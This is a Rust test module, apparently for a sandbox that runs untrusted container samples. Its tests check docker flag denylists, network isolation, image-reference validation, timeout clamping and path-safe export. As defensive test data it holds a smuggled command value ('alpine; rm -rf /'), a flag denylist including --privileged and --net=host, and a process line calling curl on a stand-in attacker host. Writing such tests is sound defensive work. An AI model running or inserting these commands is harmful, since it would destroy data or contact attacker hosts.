        let ctx = docker_context_for(&profile_for("ab12cd34"));
        let args = build_run_args(&ctx, "alpine:latest", &[]);

        for forbidden in ["-v", "--volume", "--mount", "--privileged", "--net=host"] {
            assert!(
                !args.contains(&forbidden),
                "{forbidden} must never reach the sample's argv"
            );
        }
        let net = args.iter().position(|a| *a == "--network").expect("network flag");
        assert_eq!(args[net + 1], "none", "v1 runs with no network at all");
        assert!(args.contains(&"--pids-limit"), "a fork bomb must not take the VM down");
    }

    #[test]
    fn a_command_override_cannot_smuggle_flags_ahead_of_the_image() {
        // Everything the caller supplies lands *after* the image, where docker
        // reads it as the container's command rather than as its own options.
        let overrides = vec!["--privileged".to_string(), "sh".to_string()];
        let args = build_run_args("colima-x", "alpine:latest", &overrides);
        let image_at = args.iter().position(|a| *a == "alpine:latest").expect("image");
        let priv_at = args.iter().position(|a| *a == "--privileged").expect("override");
        assert!(priv_at > image_at, "overrides must not be read as docker flags");
    }

    #[test]
    fn an_image_reference_that_looks_like_a_flag_is_refused() {
        // Without this, `image: "--privileged"` would be parsed by docker as an
        // option and hand the sample the host.
        assert!(validate_image_ref("--privileged").is_err());
        assert!(validate_image_ref("-v").is_err());
        assert!(validate_image_ref("").is_err());
        assert!(validate_image_ref("   ").is_err());
        assert!(validate_image_ref("alpine; rm -rf /").is_err());
        assert!(validate_image_ref("alpine latest").is_err());

        assert!(validate_image_ref("alpine:latest").is_ok());
        assert!(validate_image_ref("ghcr.io/owner/name:1.2.3").is_ok());
        assert!(validate_image_ref("alpine@sha256:abc123").is_ok());
    }

    #[test]
    fn timeouts_are_clamped_to_the_ceiling() {
        // Calls the function `run_session_blocking` uses, so raising the ceiling
        // in production without meaning to fails here.
        assert_eq!(clamp_timeout(Some(86_400)), MAX_TIMEOUT_SECS);
        assert_eq!(clamp_timeout(Some(30)), 30);
        assert_eq!(clamp_timeout(Some(MAX_TIMEOUT_SECS)), MAX_TIMEOUT_SECS);
        assert_eq!(clamp_timeout(None), DEFAULT_TIMEOUT_SECS);
    }

    #[test]
    fn a_wedged_session_stops_blocking_new_ones() {
        // One hung `colima start` must not disable the feature for the rest of
        // the process's life.
        let now = now_ms();
        let stuck = DetonationSession {
            id: "stuck".into(),
            image: "alpine".into(),
            status: SessionStatus::Preparing,
            started_ms: now - WEDGED_AFTER_MS - 1,
            exit_code: None,
            error: None,
            timeline: Vec::new(),
        };
        assert!(is_wedged(&stuck, now));

        let working = DetonationSession {
            started_ms: now - 5_000,
            ..stuck.clone()
        };
        assert!(!is_wedged(&working, now), "a session doing real work still counts");

        let finished = DetonationSession {
            status: SessionStatus::Completed,
            started_ms: now - WEDGED_AFTER_MS - 1,
            ..stuck.clone()
        };
        assert!(!is_wedged(&finished, now), "a finished session is not wedged");
    }

    #[test]
    fn docker_top_output_yields_the_command_column() {
        // Real header from `docker top`, then a command containing spaces.
        assert_eq!(
            parse_top_line("UID PID PPID C STIME TTY TIME CMD"),
            None,
            "the header is not a process"
        );
        assert_eq!(
            parse_top_line("root 1234 1200 0 08:30 ? 00:00:00 /bin/sh -c curl http://evil.example"),
            Some("/bin/sh -c curl http://evil.example".to_string()),
            "a command with spaces must not be truncated"
        );
        assert_eq!(parse_top_line(""), None);
        assert_eq!(parse_top_line("root 1 2"), None, "a short row has no command");
    }

    #[test]
    fn a_detonation_context_is_never_restored_to() {
        // Restoring *to* a context that is about to be deleted would leave the
        // CLI pointing at nothing. The guard is a string rule, so it is checked
        // as one.
        // Calls the production predicate, so a regression in it fails here.
        assert!(is_detonation_context(&docker_context_for(&profile_for("ab12cd34"))));
        // The contexts a user actually works in must all be restorable.
        assert!(!is_detonation_context("colima"));
        assert!(!is_detonation_context("default"));
        assert!(!is_detonation_context("colima-work"));
        assert!(!is_detonation_context("desktop-linux"));
        // Non-ASCII must not panic.
        assert!(!is_detonation_context("colima-café"));
        // Every fallback must itself be restorable, or the fallback loop is a
        // no-op that leaves the CLI on a deleted context.
        for candidate in FALLBACK_CONTEXTS {
            assert!(!is_detonation_context(candidate));
        }
    }

    #[test]
    fn export_refuses_a_filename_that_is_really_a_path() {
        // A real session must exist first, or every case fails on "unknown
        // session" and the path guards are never reached — which is what the
        // previous version of this test actually asserted.
        let id = "exporttest";
        SESSIONS.lock().expect("lock").insert(
            id.to_string(),
            Session {
                view: DetonationSession {
                    id: id.to_string(),
                    image: "alpine:latest".into(),
                    status: SessionStatus::Completed,
                    started_ms: 0,
                    exit_code: Some(0),
                    error: None,
                    timeline: Vec::new(),
                },
                cancelled: false,
            },
        );

        let home = std::path::PathBuf::from(std::env::var("HOME").expect("HOME"));

        for bad in ["../escaped.json", "a/b.json", "", "sub\\b.json"] {
            let result = export_session(id, &home, bad);
            assert!(result.is_err(), "filename {bad:?} must be refused");
        }

        // And the directory half: outside the home directory is refused even
        // with a perfectly ordinary filename.
        assert!(
            export_session(id, std::path::Path::new("/etc"), "report.json").is_err(),
            "a directory outside home must be refused"
        );

        // The legitimate case still works, or the guards are too strict.
        let ok = export_session(id, &home, "detonation-export-test.json");
        assert!(ok.is_ok(), "a normal export must still succeed: {ok:?}");
        if let Ok(path) = ok {
            let _ = std::fs::remove_file(path);
        }

        SESSIONS.lock().expect("lock").remove(id);
    }

    #[test]
    fn finished_sessions_are_pruned_but_running_ones_are_kept() {
        let mut sessions: HashMap<String, Session> = HashMap::new();
        let make = |id: &str, status: SessionStatus, started: i64| Session {
            view: DetonationSession {
                id: id.to_string(),
                image: "alpine".into(),
                status,
                started_ms: started,
                exit_code: None,
                error: None,
                timeline: Vec::new(),
            },
            cancelled: false,
        };
        for i in 0..(MAX_RETAINED_SESSIONS + 5) {
            sessions.insert(
                format!("done{i}"),
                make(&format!("done{i}"), SessionStatus::Completed, i as i64),
            );
        }
        sessions.insert("live".into(), make("live", SessionStatus::Running, 0));

        prune_sessions(&mut sessions);

        assert!(sessions.contains_key("live"), "a running session is never dropped");
        let finished = sessions.values().filter(|s| is_terminal(s.view.status)).count();
        assert_eq!(finished, MAX_RETAINED_SESSIONS);
        assert!(!sessions.contains_key("done0"), "the oldest goes first");
    }

    #[test]
    fn a_cancelled_session_is_reported_as_cancellable_only_while_known() {
        assert!(!cancel("no-such-session"));
    }
}
